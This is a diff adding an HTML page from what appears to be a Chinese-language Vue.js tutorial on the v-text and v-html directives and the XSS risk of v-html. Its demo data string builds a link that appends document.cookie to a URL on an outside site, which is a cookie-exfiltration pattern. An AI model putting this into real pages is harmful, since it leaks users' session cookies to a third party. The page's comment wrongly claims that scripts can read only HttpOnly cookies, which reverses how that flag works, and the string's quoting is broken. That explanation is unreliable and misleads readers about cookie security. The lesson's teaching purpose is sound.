@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>p40-41:v-text及v-html指令及安全问题</title>
+    <script type="text/javascript" src="js/vue.js"></script>
+</head>
+
+<body>
+
+
+<div id="demo">
+    <p>这种更灵活：{{str}}</p>
+    <p v-text="str">这种会全部替换掉，不灵活</p>
+    <div v-html="str">
+        这种不安全，但可以解析html,除非这个数据可信，否则可能会被xss攻击<br/>
+        document.cookie只能读到浏览器保存的cookie中http-only为true的cookie<br/>
+        所以后端为了安全起见设置cookie的时候要将http-only设置为true<br/>
+        如php中setcookie(.....第7个参数设置为true)
+    </div>
+</div>
+<script type="text/javascript">
+
+    //创建vue实例
+    const vm = new Vue({
+        el: "#demo",
+        data: {
+            str:'<a href="http://www.hu-rong.com?cookie="'+document.cookie+' target="_blank">个人主页</a>'
+        },
+        methods: {
+
+        },
+        computed: {},
+        watch: {},
+        filters:{
+
+        }
+    })
+
+</script>
+</body>
+</html>
